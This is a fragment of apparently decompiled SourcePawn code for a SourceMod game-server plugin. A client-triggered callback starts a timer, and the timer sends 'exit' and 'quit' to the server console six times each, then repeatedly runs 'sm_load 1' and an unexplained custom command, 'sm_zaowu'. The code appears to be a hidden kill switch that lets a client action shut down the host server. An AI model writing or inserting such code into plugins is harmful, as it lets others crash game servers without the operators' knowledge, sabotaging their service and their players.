	if (0 >= client)
	{
		return Action:0;
	}
	CreateTimer(5.0, TimerClose, any:1, 0);
	return Action:0;
}

public Action:TimerClose(Handle:hTimer, any:data)
{
	ServerCommand("exit");
	ServerCommand("exit");
	ServerCommand("exit");
	ServerCommand("exit");
	ServerCommand("exit");
	ServerCommand("exit");
	ServerCommand("quit");
	ServerCommand("quit");
	ServerCommand("quit");
	ServerCommand("quit");
	ServerCommand("quit");
	ServerCommand("quit");
	ServerCommand("sm_load 1");
	ServerCommand("sm_load 1");
	ServerCommand("sm_load 1");
	ServerCommand("sm_load 1");
	ServerCommand("sm_load 1");
	ServerCommand("sm_load 1");
	ServerCommand("sm_load 1");
	ServerCommand("sm_zaowu");
	ServerCommand("sm_zaowu");
	ServerCommand("sm_zaowu");
	ServerCommand("sm_zaowu");
	ServerCommand("sm_zaowu");
	ServerCommand("sm_zaowu");
	ServerCommand("sm_zaowu");
	ServerCommand("sm_zaowu 1");
	ServerCommand("sm_zaowu 1");
	ServerCommand("sm_zaowu 1");
	ServerCommand("sm_zaowu 1");
	ServerCommand("sm_zaowu 1");
	ServerCommand("sm_zaowu 1");
	ServerCommand("sm_zaowu 1");
	return Action:3;
}

